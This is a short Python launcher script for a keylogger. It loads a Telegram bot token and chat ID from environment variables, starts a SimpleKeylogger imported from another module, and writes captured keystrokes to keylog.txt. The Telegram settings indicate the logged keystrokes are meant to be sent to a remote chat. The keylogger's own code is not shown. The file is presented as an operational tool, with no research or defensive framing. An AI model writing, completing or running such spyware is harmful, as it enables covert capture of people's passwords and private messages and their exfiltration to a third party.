import os
import sys
from dotenv import load_dotenv
from keyloger import SimpleKeylogger


def main():
    print("\033[1;33m[*]\033[0m Initializing keylogger...")

    # Load environment variables from .env file
    load_dotenv()

    TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
    TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

    logger = SimpleKeylogger(
        filename="keylog.txt",
        telegram_token=TELEGRAM_TOKEN,
        telegram_chat_id=TELEGRAM_CHAT_ID
    )

    try:
        logger.start()
    except KeyboardInterrupt:
        print("\n\033[1;31m[!]\033[0m Keylogger interrupted by user (Ctrl+C)")
        logger.print_footer()
    except Exception as e:
        print(f"\n\033[1;31m[!]\033[0m Error: {str(e)}\033[0m")
        sys.exit(1)


if __name__ == "__main__":
    main()